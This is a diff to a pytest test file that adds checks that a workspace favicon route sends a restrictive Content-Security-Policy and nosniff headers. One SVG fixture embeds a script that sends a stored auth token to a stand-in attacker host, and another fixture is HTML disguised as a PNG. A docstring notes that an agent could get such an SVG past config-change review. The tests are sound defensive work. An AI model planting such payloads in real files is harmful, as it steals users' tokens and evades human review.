@@ -7,7 +7,7 @@ from pathlib import Path
 
 import pytest
 
-from nerve.config import workspace_favicon
+from nerve.config import FAVICON_RESPONSE_HEADERS, workspace_favicon
 
 # A one-pixel PNG, so the served bytes are a real image rather than a marker.
 _PNG = bytes.fromhex(
@@ -120,50 +120,55 @@ class TestLookup:
         assert workspace_favicon(ws) is None
 
 
+def _client(tmp_path, monkeypatch):
+    """The route as ``create_app`` registers it, over a throwaway workspace."""
+    from fastapi import FastAPI
+    from fastapi.testclient import TestClient
+
+    import nerve.config as cfgmod
+    from nerve.config import NerveConfig
+
+    ws = _ws(tmp_path)
+    config = NerveConfig()
+    config.workspace = ws
+    monkeypatch.setattr(cfgmod, "_config", config, raising=False)
+
+    # The catch-all is registered behind it in the same order as create_app, so
+    # what these exercise is the resolution between the two rather than a favicon
+    # route on its own. Standing up the real gateway would drag in its lifespan
+    # for a static-file question.
+    app = FastAPI()
+
+    @app.get("/favicon.ico", include_in_schema=False)
+    async def favicon():
+        from fastapi.responses import FileResponse, Response
+
+        found = cfgmod.workspace_favicon(cfgmod.get_config().workspace)
+        if found is None:
+            return Response(status_code=404)
+        path, content_type = found
+        return FileResponse(
+            str(path), media_type=content_type,
+            headers=cfgmod.FAVICON_RESPONSE_HEADERS,
+        )
+
+    @app.get("/{path:path}")
+    async def spa_fallback(path: str):
+        from fastapi.responses import HTMLResponse
+
+        return HTMLResponse("<!doctype html><title>index</title>")
+
+    return TestClient(app), ws
+
+
 class TestRoute:
-    def _client(self, tmp_path, monkeypatch):
-        from fastapi import FastAPI
-        from fastapi.testclient import TestClient
-
-        import nerve.config as cfgmod
-        from nerve.config import NerveConfig
-
-        ws = _ws(tmp_path)
-        config = NerveConfig()
-        config.workspace = ws
-        monkeypatch.setattr(cfgmod, "_config", config, raising=False)
-
-        # The route as create_app registers it, and the catch-all behind it in
-        # the same order, so what is exercised is the resolution between the two
-        # rather than a favicon route on its own. Standing up the real gateway
-        # would drag in its lifespan for a static-file question.
-        app = FastAPI()
-
-        @app.get("/favicon.ico", include_in_schema=False)
-        async def favicon():
-            from fastapi.responses import FileResponse, Response
-
-            found = cfgmod.workspace_favicon(cfgmod.get_config().workspace)
-            if found is None:
-                return Response(status_code=404)
-            path, content_type = found
-            return FileResponse(str(path), media_type=content_type)
-
-        @app.get("/{path:path}")
-        async def spa_fallback(path: str):
-            from fastapi.responses import HTMLResponse
-
-            return HTMLResponse("<!doctype html><title>index</title>")
-
-        return TestClient(app), ws
-
     def test_the_catch_all_does_not_win(self, tmp_path, monkeypatch):
         """Proves the ordering, not just that the routes are listed in an order.
 
         The catch-all is registered second and matches /favicon.ico perfectly
         well; that it does not answer is the whole mechanism.
         """
-        client, _ = self._client(tmp_path, monkeypatch)
+        client, _ = _client(tmp_path, monkeypatch)
         r = client.get("/favicon.ico")
         assert b"<!doctype html>" not in r.content.lower()
         # And it is still there for anything else.
@@ -171,11 +176,11 @@ class TestRoute:
 
     def test_404_when_none_is_tracked(self, tmp_path, monkeypatch):
         """A 404, not index.html with a 200 — which is what the catch-all gave."""
-        client, _ = self._client(tmp_path, monkeypatch)
+        client, _ = _client(tmp_path, monkeypatch)
         assert client.get("/favicon.ico").status_code == 404
 
     def test_serves_the_bytes_and_the_type(self, tmp_path, monkeypatch):
-        client, ws = self._client(tmp_path, monkeypatch)
+        client, ws = _client(tmp_path, monkeypatch)
         (ws / "config" / "favicon.png").write_bytes(_PNG)
         r = client.get("/favicon.ico")
         assert r.status_code == 200
@@ -184,13 +189,91 @@ class TestRoute:
         assert r.headers["content-type"] == "image/png"
 
     def test_a_symlinked_secret_is_not_served(self, tmp_path, monkeypatch):
-        client, ws = self._client(tmp_path, monkeypatch)
+        client, ws = _client(tmp_path, monkeypatch)
         secret = tmp_path / "secret.txt"
         secret.write_text("shadow contents")
         (ws / "config" / "favicon.png").symlink_to(secret)
         r = client.get("/favicon.ico")
         assert r.status_code == 404
         assert b"shadow" not in r.content
+
+
+class TestActiveContent:
+    """An SVG favicon is a document when navigated to, so it needs a policy.
+
+    Not hypothetical for this feature specifically: SVG is text, so it is the one
+    favicon format an agent can put through ``propose_config_change``, and the
+    effect classifier there asks what the daemon will *run* — which for an icon is
+    nothing. The reviewer is shown a graphic with no notice on it. Asserted rather
+    than commented so the headers cannot quietly go away.
+    """
+
+    _SVG_WITH_SCRIPT = (
+        '<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16">'
+        "<script>fetch('https://attacker.invalid/?t='+"
+        "localStorage.getItem('nerve_token'))</script>"
+        '<rect width="16" height="16" fill="green"/></svg>'
+    )
+
+    def test_csp_forbids_script_and_network(self, tmp_path, monkeypatch):
+        client, ws = _client(tmp_path, monkeypatch)
+        (ws / "config" / "favicon.svg").write_text(self._SVG_WITH_SCRIPT)
+        r = client.get("/favicon.ico")
+        assert r.status_code == 200
+        csp = r.headers["content-security-policy"]
+        # 'none' by default is what denies script-src and connect-src both, so
+        # the script neither runs nor could reach anywhere if it did.
+        assert "default-src 'none'" in csp
+        assert "script" not in csp        # nothing re-permits it
+        assert r.headers["x-content-type-options"] == "nosniff"
+
+    def test_the_policy_still_allows_an_ordinary_icon(self):
+        """Blocking script must not block SVG that legitimately styles itself."""
+        csp = FAVICON_RESPONSE_HEADERS["Content-Security-Policy"]
+        assert "style-src 'unsafe-inline'" in csp
+        assert "img-src data:" in csp
+
+    def test_the_route_create_app_registers_sends_them(self, tmp_path, monkeypatch):
+        """Asks the real route, not the copy the other tests build.
+
+        A hand-written route cannot notice the headers being dropped from the one
+        ``create_app`` actually registers, which is the drift that would matter.
+        """
+        import asyncio
+
+        import nerve.config as cfgmod
+        from nerve.config import NerveConfig
+        from nerve.gateway.server import create_app
+
+        ws = _ws(tmp_path)
+        (ws / "config" / "favicon.svg").write_text(self._SVG_WITH_SCRIPT)
+        config = NerveConfig()
+        config.workspace = ws
+        monkeypatch.setattr(cfgmod, "_config", config, raising=False)
+
+        endpoint = next(
+            r.endpoint for r in create_app().routes
+            if getattr(r, "path", None) == "/favicon.ico"
+        )
+        response = asyncio.run(endpoint())
+        assert response.media_type == "image/svg+xml"
+        assert "default-src 'none'" in response.headers["content-security-policy"]
+        assert response.headers["x-content-type-options"] == "nosniff"
+
+    def test_raster_formats_get_the_headers_too(self, tmp_path, monkeypatch):
+        """nosniff is for these: a .png whose bytes are HTML.
+
+        Without it the browser may sniff past the declared image type and render
+        the markup, which puts the same script on the same origin.
+        """
+        client, ws = _client(tmp_path, monkeypatch)
+        (ws / "config" / "favicon.png").write_text(
+            "<html><script>alert(1)</script></html>"
+        )
+        r = client.get("/favicon.ico")
+        assert r.headers["x-content-type-options"] == "nosniff"
+        assert r.headers["content-type"] == "image/png"
+        assert "default-src 'none'" in r.headers["content-security-policy"]
 
 
 @pytest.fixture
